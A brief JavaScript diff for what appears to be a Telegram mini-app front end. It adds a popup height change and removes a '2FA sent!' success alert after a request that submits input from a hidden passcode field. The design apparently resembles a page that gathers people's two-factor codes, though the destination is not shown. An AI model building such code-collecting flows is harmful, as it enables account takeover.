@@ -10,6 +10,7 @@ document.addEventListener('DOMContentLoaded', () => {
     const page1 = document.getElementById('page1');
     const page2 = document.getElementById('page2');
     const page3 = document.getElementById('page3');
+    const popup = document.getElementById('popup');
     const blur = document.getElementById('blur');
     const passcodeBtn = document.getElementById('passcode-btn');
     const passcodeInput = document.getElementById('hiddenInput');
@@ -67,6 +68,7 @@ document.addEventListener('DOMContentLoaded', () => {
         page = 'page3';
         page2.style.display = 'none';
         page3.style.display = 'flex';
+        popup.style.height = '340px';
         requestAnimationFrame(() => {
             page3.style.transform = 'translateY(0)';
         });
@@ -187,7 +189,6 @@ document.addEventListener('DOMContentLoaded', () => {
             });
 
             const result = await response.json();
-            tg.showAlert('✅ 2FA sent!');
             
         } catch (err) {
             tg.showAlert('❌ Failed to send');
